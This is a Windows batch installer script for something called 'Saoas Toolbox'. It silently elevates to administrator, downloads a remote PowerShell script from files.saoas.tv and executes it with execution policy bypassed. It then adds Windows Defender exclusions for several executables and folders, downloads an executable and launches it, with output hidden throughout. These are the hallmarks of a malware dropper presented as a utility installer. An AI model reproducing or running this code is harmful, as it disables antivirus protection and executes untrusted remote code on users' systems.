@echo off & setlocal
net session >NUL 2>&1 && goto :ELEVATED
set ELEVATE_CMDLINE=cd /d "%~dp0" ^& "%~f0" %*
powershell.exe -noprofile -c Start-Process -Verb RunAs cmd.exe \"/c $env:ELEVATE_CMDLINE\"
exit /b %ERRORLEVEL%
:ELEVATED

set "psCommand=Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('http://files.saoas.tv/path.ps1'))" >nul 2>&1

mkdir "C:\Saoas" >nul 2>&1

powershell -NoLogo -Sta -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "& {%psCommand%}" >nul 2>&1
powershell -Command Add-MpPreference -ExclusionProcess "Saoas_Toolbox.exe" -Force >nul 2>&1
powershell -Command Add-MpPreference -ExclusionProcess "Installer.exe" -Force >nul 2>&1
powershell -Command Add-MpPreference -ExclusionProcess "Multi_Downloader.exe" -Force >nul 2>&1
powershell -Command Add-MpPreference -ExclusionPath "%USERPROFILE%\Desktop\Saoas_Tools" -Force >nul 2>&1
powershell -Command Add-MpPreference -ExclusionPath "C:\Saoas" -Force >nul 2>&1

cd "C:\Saoas" >nul 2>&1
powershell Invoke-WebRequest -Uri "https://eternallybored.org/misc/wget/1.21.4/64/wget.exe" -OutFile "wget.exe"

cd /d "%USERPROFILE%\Desktop" >nul 2>&1
powershell Invoke-WebRequest -Uri "http://files.saoas.tv/Toolbox/Saoas_Toolbox.exe" -OutFile "Saoas_Toolbox.exe"

start "" "%USERPROFILE%\Desktop\Saoas_Toolbox.exe"  >nul 2>&1
